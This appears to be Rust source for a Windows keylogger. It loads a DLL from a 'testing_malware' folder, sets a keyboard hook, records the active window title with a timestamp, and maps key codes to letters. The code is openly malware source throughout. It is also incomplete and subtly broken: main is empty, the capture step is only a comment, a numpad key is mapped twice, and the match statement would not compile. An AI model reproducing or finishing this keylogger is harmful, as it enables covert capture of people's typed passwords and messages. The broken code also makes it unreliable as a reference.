extern crate widestring;
#[cfg(windows)]
extern crate winapi;

mod lib;
use lib::{
    append_file, close_handle, copy_self_to_path, create_file, get_current_path, get_file_size,
    get_proc_address, load_library, open_file, read_file, write_file,
};
use std::ffi::CString;
use std::io::Error;
use std::ptr::null_mut;
use widestring::WideCString;
use winapi::shared::minwindef::{FARPROC, HMODULE, LPARAM, LRESULT, MAX_PATH, WPARAM};
use winapi::shared::windef::{HHOOK, HWND, HWND__};
use winapi::um::winnt::HANDLE;
use winapi::um::winuser::{
    GetForegroundWindow, GetKeyState, GetWindowTextA, SetWindowsHookExW, UnhookWindowsHookEx,
    HC_ACTION, KBDLLHOOKSTRUCT, VK_CAPITAL, VK_LSHIFT, VK_NUMPAD0, VK_RSHIFT, VK_SLEEP,
    WH_KEYBOARD, WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN,VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD1, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6
};
//https://github.com/jamalcoder/winapi-dynamic-api-call-using-rust/blob/master/src/main.rs
use winapi::um::minwinbase::SYSTEMTIME;
use winapi::um::sysinfoapi::GetLocalTime;

pub struct window {
    last_window: HWND,
}
static mut WINDOW: window = window {
    last_window: null_mut(),
};
fn main() {}

fn testing() {
    let dll_module =
        load_library("C:\\Users\\chuon\\OneDrive\\Desktop\\testing_malware\\malware_simple.dll");

    let hook = get_proc_address(
        dll_module,
        "_ZN14malware_simple13keyboard_proc17hac4210425faef974E",
    );

    let function: Option<
        unsafe extern "system" fn(code: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT,
    >;

    function = unsafe { std::mem::transmute(hook) };
    let handle = unsafe { SetWindowsHookExW(WH_KEYBOARD, function, dll_module, 0) };
    unsafe { winapi::um::synchapi::Sleep(10000) };
    unsafe { UnhookWindowsHookEx(handle) };
}

fn unhook_keyboard(handle: HHOOK) {
    unsafe { UnhookWindowsHookEx(handle) };
    std::process::exit(0);
}

unsafe extern "system" fn hook_procedure(code: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT {
    let mut log: String = String::from("");
    let mut output: String = String::from("");
    let mut caps = false;
    let mut shift = false;
    let caps_key_state: i16 = GetKeyState(VK_CAPITAL);
    if caps_key_state > 0 {
        caps = true;
    }

    let p: *mut KBDLLHOOKSTRUCT =
        std::mem::transmute(&lParam as *const _ as *const KBDLLHOOKSTRUCT);
    let p: KBDLLHOOKSTRUCT = *p;
    if code == HC_ACTION {
        // message ready to be picked up
        //if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
        if p.vkCode as i32 == VK_LSHIFT || p.vkCode as i32 == VK_RSHIFT {
            // shift key pressed
            let w = wParam as u32;
            match w {
                WM_KEYDOWN => {
                    shift = true;
                }
                WM_KEYUP => {
                    shift = false;
                }
                _ => {
                    shift = false;
                }
            }
        }

        // start logging
        if wParam as u32 == WM_SYSKEYDOWN || wParam as u32 == WM_KEYDOWN {
            let current_window: HWND = GetForegroundWindow();
            if WINDOW.last_window != current_window {
                // We're in a new window. Log this info
                let mut system_time: SYSTEMTIME = SYSTEMTIME {
                    wYear: 0,
                    wMonth: 0,
                    wDayOfWeek: 0,
                    wDay: 0,
                    wHour: 0,
                    wMinute: 0,
                    wSecond: 0,
                    wMilliseconds: 0,
                };
                GetLocalTime(&mut system_time);
                let day = system_time.wDay;
                let month = system_time.wMonth;
                let year = system_time.wYear;
                let hour = system_time.wHour;
                let min = system_time.wMinute;
                let sec = system_time.wSecond;
                let day_of_week = system_time.wDayOfWeek;

                log.push_str("\n\n[+] Day of the week ");
                log.push_str(&get_day_name(day_of_week));
                log.push_str(" - ");
                log.push_str(&day.to_string());
                log.push_str("/");
                log.push_str(&month.to_string());
                log.push_str("/");
                log.push_str(&year.to_string());
                log.push_str(" - ");
                log.push_str(&hour.to_string());
                log.push_str(":");
                log.push_str(&min.to_string());
                log.push_str(":");
                log.push_str(&sec.to_string());
                log.push_str(" --- ");

                let mut buffer: Vec<u8> = Vec::new();
                for _i in 0..100 {
                    buffer.push(0u8);
                }
                let window_string = CString::from_vec_unchecked(buffer);
                let count = GetWindowTextA(current_window, window_string.as_ptr() as *mut i8, 100);
                log.push_str(&(window_string.into_string().unwrap())[..count as usize]);
                WINDOW.last_window = current_window;
            }
            if p.vkCode != 0 {
                // capture keystroke
            }
        }
    }
    return 0isize;
}

fn get_day_name(day_of_week: u16) -> String {
    match day_of_week {
        0 => {
            return String::from("Monday");
        }
        1 => {
            return String::from("Tuesday");
        }
        2 => {
            return String::from("Wednesday");
        }
        3 => {
            return String::from("Thursday");
        }
        4 => {
            return String::from("Friday");
        }
        5 => {
            return String::from("Saturday");
        }
        6 => {
            return String::from("Sunday");
        }
        _ => {
            return String::from("Unknown day");
        }
    }
}

fn HookCode(code: u32, caps: bool, shift: bool) -> String {
    let mut key: &str = "";
    let code = code as i32;
    match code {
        // ASCII character
        0x41 => {
            key = if caps {
                if shift {
                    "a"
                } else {
                    "A"
                }
            } else {
                if shift {
                    "A"
                } else {
                    "a"
                }
            };
        }
        0x42 => {
            key = if caps {
                if shift {
                    "b"
                } else {
                    "B"
                }
            } else {
                if shift {
                    "B"
                } else {
                    "b"
                }
            };
        }
        0x43 => {
            key = if caps {
                if shift {
                    "c"
                } else {
                    "C"
                }
            } else {
                if shift {
                    "C"
                } else {
                    "c"
                }
            };
        }
        0x44 => {
            key = if caps {
                if shift {
                    "d"
                } else {
                    "D"
                }
            } else {
                if shift {
                    "D"
                } else {
                    "d"
                }
            };
        }
        0x45 => {
            key = if caps {
                if shift {
                    "e"
                } else {
                    "E"
                }
            } else {
                if shift {
                    "E"
                } else {
                    "e"
                }
            };
        }
        0x46 => {
            key = if caps {
                if shift {
                    "f"
                } else {
                    "F"
                }
            } else {
                if shift {
                    "F"
                } else {
                    "f"
                }
            };
        }
        0x47 => {
            key = if caps {
                if shift {
                    "g"
                } else {
                    "G"
                }
            } else {
                if shift {
                    "G"
                } else {
                    "g"
                }
            };
        }
        0x48 => {
            key = if caps {
                if shift {
                    "h"
                } else {
                    "H"
                }
            } else {
                if shift {
                    "H"
                } else {
                    "h"
                }
            };
        }
        0x49 => {
            key = if caps {
                if shift {
                    "i"
                } else {
                    "I"
                }
            } else {
                if shift {
                    "I"
                } else {
                    "i"
                }
            };
        }
        0x4A => {
            key = if caps {
                if shift {
                    "j"
                } else {
                    "J"
                }
            } else {
                if shift {
                    "J"
                } else {
                    "j"
                }
            };
        }
        0x4B => {
            key = if caps {
                if shift {
                    "k"
                } else {
                    "K"
                }
            } else {
                if shift {
                    "K"
                } else {
                    "k"
                }
            };
        }
        0x4C => {
            key = if caps {
                if shift {
                    "l"
                } else {
                    "L"
                }
            } else {
                if shift {
                    "L"
                } else {
                    "l"
                }
            };
        }
        0x4D => {
            key = if caps {
                if shift {
                    "m"
                } else {
                    "M"
                }
            } else {
                if shift {
                    "M"
                } else {
                    "m"
                }
            };
        }
        0x4E => {
            key = if caps {
                if shift {
                    "n"
                } else {
                    "N"
                }
            } else {
                if shift {
                    "N"
                } else {
                    "n"
                }
            };
        }
        0x4F => {
            key = if caps {
                if shift {
                    "o"
                } else {
                    "O"
                }
            } else {
                if shift {
                    "O"
                } else {
                    "o"
                }
            };
        }
        0x50 => {
            key = if caps {
                if shift {
                    "p"
                } else {
                    "P"
                }
            } else {
                if shift {
                    "P"
                } else {
                    "p"
                }
            };
        }
        0x51 => {
            key = if caps {
                if shift {
                    "q"
                } else {
                    "Q"
                }
            } else {
                if shift {
                    "Q"
                } else {
                    "q"
                }
            };
        }
        0x52 => {
            key = if caps {
                if shift {
                    "r"
                } else {
                    "R"
                }
            } else {
                if shift {
                    "R"
                } else {
                    "r"
                }
            };
        }
        0x53 => {
            key = if caps {
                if shift {
                    "s"
                } else {
                    "S"
                }
            } else {
                if shift {
                    "S"
                } else {
                    "s"
                }
            };
        }
        0x54 => {
            key = if caps {
                if shift {
                    "t"
                } else {
                    "T"
                }
            } else {
                if shift {
                    "T"
                } else {
                    "t"
                }
            };
        }
        0x55 => {
            key = if caps {
                if shift {
                    "u"
                } else {
                    "U"
                }
            } else {
                if shift {
                    "U"
                } else {
                    "u"
                }
            };
        }
        0x56 => {
            key = if caps {
                if shift {
                    "v"
                } else {
                    "V"
                }
            } else {
                if shift {
                    "V"
                } else {
                    "v"
                }
            };
        }
        0x57 => {
            key = if caps {
                if shift {
                    "w"
                } else {
                    "W"
                }
            } else {
                if shift {
                    "W"
                } else {
                    "w"
                }
            };
        }
        0x58 => {
            key = if caps {
                if shift {
                    "x"
                } else {
                    "X"
                }
            } else {
                if shift {
                    "X"
                } else {
                    "x"
                }
            };
        }
        0x59 => {
            key = if caps {
                if shift {
                    "y"
                } else {
                    "Y"
                }
            } else {
                if shift {
                    "Y"
                } else {
                    "y"
                }
            };
        }
        0x5A => {
            key = if caps {
                if shift {
                    "z"
                } else {
                    "Z"
                }
            } else {
                if shift {
                    "Z"
                } else {
                    "z"
                }
            };
        }
        VK_SLEEP => {
            key = "[SLEEP]";
        }
        VK_NUMPAD0 => {
            key = "0";
        }
        VK_NUMPAD1 => {
            key = "1";
        }
        VK_NUMPAD2 => {
            key = "2";
        }
        VK_NUMPAD3 => {
            key = "3";
        }
        VK_NUMPAD4 => {
            key = "4";
        }
        VK_NUMPAD5 => {
            key = "5";
        }
        VK_NUMPAD6 => {
            key = "6";
        }
        VK_NUMPAD3 => {
            key = "7";
        }
    }
    return String::from(key);
}
